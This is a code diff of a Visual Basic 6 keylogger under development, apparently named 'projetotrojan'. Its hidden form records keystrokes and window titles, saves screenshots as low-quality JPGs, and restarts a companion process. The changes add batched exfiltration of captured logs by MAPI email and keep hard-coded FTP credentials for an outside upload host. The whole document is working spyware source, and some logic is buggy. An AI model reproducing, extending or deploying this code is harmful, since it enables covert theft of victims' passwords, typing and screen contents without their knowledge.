@@ -1,48 +1,65 @@
 VERSION 5.00
-Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "msinet.ocx"
+Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
+Object = "{20C62CAE-15DA-101B-B9A8-444553540000}#1.1#0"; "MSMAPI32.OCX"
 Begin VB.Form Form1 
    Caption         =   "Form1"
-   ClientHeight    =   4275
+   ClientHeight    =   5310
    ClientLeft      =   165
    ClientTop       =   555
-   ClientWidth     =   10545
+   ClientWidth     =   14820
    LinkTopic       =   "Form1"
-   ScaleHeight     =   4275
-   ScaleWidth      =   10545
+   ScaleHeight     =   5310
+   ScaleWidth      =   14820
    StartUpPosition =   3  'Windows Default
    Visible         =   0   'False
+   Begin MSMAPI.MAPIMessages MAPIMessages1 
+      Left            =   2040
+      Top             =   4560
+      _ExtentX        =   1005
+      _ExtentY        =   1005
+      _Version        =   393216
+      AddressEditFieldCount=   1
+      AddressModifiable=   0   'False
+      AddressResolveUI=   0   'False
+      FetchSorted     =   0   'False
+      FetchUnreadOnly =   0   'False
+   End
+   Begin MSMAPI.MAPISession MAPISession1 
+      Left            =   1320
+      Top             =   4560
+      _ExtentX        =   1005
+      _ExtentY        =   1005
+      _Version        =   393216
+      DownloadMail    =   0   'False
+      LogonUI         =   0   'False
+      NewSession      =   0   'False
+   End
+   Begin InetCtlsObjects.Inet Inet1 
+      Left            =   6960
+      Top             =   3720
+      _ExtentX        =   1005
+      _ExtentY        =   1005
+      _Version        =   393216
+   End
    Begin VB.Timer Timer4 
       Interval        =   10
       Left            =   2880
       Top             =   3480
    End
-   Begin InetCtlsObjects.Inet Inet1 
-      Left            =   6840
-      Top             =   3600
-      _ExtentX        =   1005
-      _ExtentY        =   1005
-      _Version        =   393216
-      Protocol        =   2
-      RemoteHost      =   "ftp.projetotrojan.esy.es"
-      RemotePort      =   21
-      URL             =   "ftp://u752146667.root:qweasd3274@ftp.projetotrojan.esy.es"
-      UserName        =   "u752146667.root"
-      Password        =   "qweasd3274"
-   End
    Begin VB.Timer Timer3 
-      Interval        =   1000
+      Interval        =   100
       Left            =   5760
       Top             =   3720
    End
    Begin VB.Timer Timer2 
       Interval        =   1000
-      Left            =   600
-      Top             =   11160
+      Left            =   3840
+      Top             =   4080
    End
    Begin VB.Timer Timer1 
       Interval        =   10
-      Left            =   0
-      Top             =   11280
+      Left            =   4680
+      Top             =   4320
    End
    Begin VB.TextBox Text1 
       Height          =   3015
@@ -65,19 +82,31 @@ Private Declare Function GetAsyncKeyState Lib "USER32" (ByVal vKey As Long) As I
 Dim textbuffer_janela As String
 Dim num_janela As Long
 
-'used by timer which call write in disk function
+Dim fileList(1 To 30) As String 'used to save an array of archives that will be sent to email (30 positions, vb6 are no dinamic arrays)
+Dim pos_fileList As Integer
+
+'used by timer that call write in disk function
 Dim ctd As Integer
 Dim filename As String
 
 'time in minutes to perform the function that
-Const X_WRITE_DISK = 1  'write data in disk
-Const X_SCREENSHOT = 0.2  'take an screenshot
+Const X_WRITE_DISK = 0.1  'write data in disk
+Const X_SCREENSHOT = 0.01  'take an screenshot
+Const X_SEND_MAIL = 0.15  'take an mail with data
 'Const X_SEND_FTP = 1 send all captured data to ftp - not implemented
 
 'Credentials for ftp login below
 Const FTP_HOST = "ftp.projetotrojan.esy.es" 'ftp host
 Const FTP_USER = "u752146667.root" 'ftp user
 Const FTP_PASS = "qweasd3274" 'ftp pass
+
+'Screenshot quality
+Const JPG_QUALITY = 20
+
+'Developer mode
+Dim DEV_MODE As Boolean
+
+
 
 'read current window title
 Private Function GetActiveWindowTitle() As String
@@ -211,7 +240,7 @@ If i = 160 Then retorna_tecla = retorna_tecla + " [Shift] "
 If i = 18 Then retorna_tecla = retorna_tecla + " [lfAlt] "
 If i = vbKeyNumlock Then retorna_tecla = retorna_tecla + " [NumLock] "
 'if key is unknow by the function, returns ANSII code of the key
-If retorna_tecla = "" Then retorna_tecla = "{" + Str(i) + "}"
+If retorna_tecla = "" Then retorna_tecla = "{" + str(i) + "}"
 
 End If
 Next
@@ -225,7 +254,7 @@ Private Sub Form_Load()
 On Error Resume Next
 
     MkDir$ App.Path + "\data_klg"
-
+DEV_MODE = True
 
 
 
@@ -274,22 +303,28 @@ End Sub
 Private Sub write_to_buffer()
     Dim fso As New FileSystemObject
     Dim arqtxt As TextStream
-    send_ftp_data filename 'send the last created file
     
-    filename = Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".klg"
+    filename = "NS__" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".klg"
     
-    Set arqtxt = fso.CreateTextFile(App.Path + "/" + filename, True)
+    Set arqtxt = fso.CreateTextFile(App.Path + "/data_klg/" + filename, True)
     arqtxt.Write (Text1.Text)
     Text1.Text = ""
     arqtxt.Close
+    addFileToMailSendArray filename
 End Sub
 
 Private Sub take_a_screenshot()
     Dim scrrenshotName As String
-    scrrenshotName = App.Path + "/screenshot" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".sht"
-    SavePicture CaptureScreen(), scrrenshotName
-    send_ftp_data scrrenshotName
+    scrrenshotName = App.Path + "/data_klg/" + Replace(Date$, "-", "_") + Replace(Time$, ":", "_") + ".sht"
+    SaveJPG CaptureScreen(), scrrenshotName, JPG_QUALITY
+    addFileToMailSendArray scrrenshotName
 End Sub
+
+Private Sub addFileToMailSendArray(filename As String)
+    pos_fileList = pos_fileList + 1
+    fileList(pos_fileList) = App.Path + "/data_klg/" + filename
+End Sub
+
 
 Private Sub send_ftp_data(ByVal filename As String)
     If Inet1.StillExecuting Then
@@ -308,13 +343,20 @@ End Sub
 'This is nescessary becouse the timer object in vb6 not support large intervals
 Private Sub Timer3_Timer()
     ctd = ctd + 1
-    
     If ctd Mod (60 * X_WRITE_DISK) = 0 Then write_to_buffer
     If ctd Mod (60 * X_SCREENSHOT) = 0 Then take_a_screenshot
+    If ctd Mod (60 * X_SEND_MAIL) = 0 Then SendMessage fileList, pos_fileList
 End Sub
 
 Private Sub Timer4_Timer()
- If IsProcessRunning("lis.exe") = False Then
+ If IsProcessRunning("lis.exe") = False And DEV_MODE = False Then
     Shell (App.Path + "/lis.exe")
  End If
 End Sub
+
+Private Function IsProcessRunning(exeName As String) As Boolean
+   Dim strQuery As String
+   strQuery = "SELECT Name FROM Win32_Process WHERE Name='" & exeName & "'"
+   isRunningExe = GetObject("winmgmts:").ExecQuery(strQuery).Count
+End Function
+
